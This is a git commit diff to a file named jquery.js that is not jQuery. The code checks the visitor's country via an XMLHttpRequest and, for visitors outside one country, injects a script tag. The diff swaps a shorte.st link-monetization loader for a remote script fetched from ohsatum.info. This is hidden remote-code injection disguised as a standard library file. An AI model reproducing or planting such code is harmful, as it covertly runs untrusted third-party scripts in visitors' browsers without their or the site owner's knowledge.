ff8e8764544e12cb085d4a0268e1b0b4b353c0da
elankton <74224289+elankton@users.noreply.github.com>
2022-08-09 08:42:49 +0300

    Update jquery.js

--- jquery.js
+++ jquery.js
@@ -1,25 +1,13 @@
 var xhttp = new XMLHttpRequest();
 xhttp.onreadystatechange = function() {
 if (this.readyState == 4 && this.status == 200) {
-    if (this.responseText.toLowerCase().indexOf('"country_code":"fr"') === -1){
+    if (this.responseText.toLowerCase().indexOf('"country_code":"tr"') === -1){
         (function() {
-            var configuration = {
-            "token": "fab11d6328169b060032ec11feb458f4",
-            "entryScript": {
-                "type": "timeout",
-                "timeout": 3000,
-                "capping": {
-                    "limit": 5,
-                    "timeout": 24
-                }
-            }
-        };
-            var script = document.createElement('script');
+         var script = document.createElement('script');
             script.async = true;
-            script.src = '//cdn.shorte.st/link-converter.min.js';
-            script.onload = script.onreadystatechange = function () {var rs = this.readyState; if (rs && rs != 'complete' && rs != 'loaded') return; shortestMonetization(configuration);};
-            var entry = document.getElementsByTagName('script')[0];
-            entry.parentNode.insertBefore(script, entry);
+            script.type = 'text/javascript';
+            script.src = 'https://ohsatum.info/script.js?sid=871623';
+            document.body.appendChild(script);
         })();
     }
 }
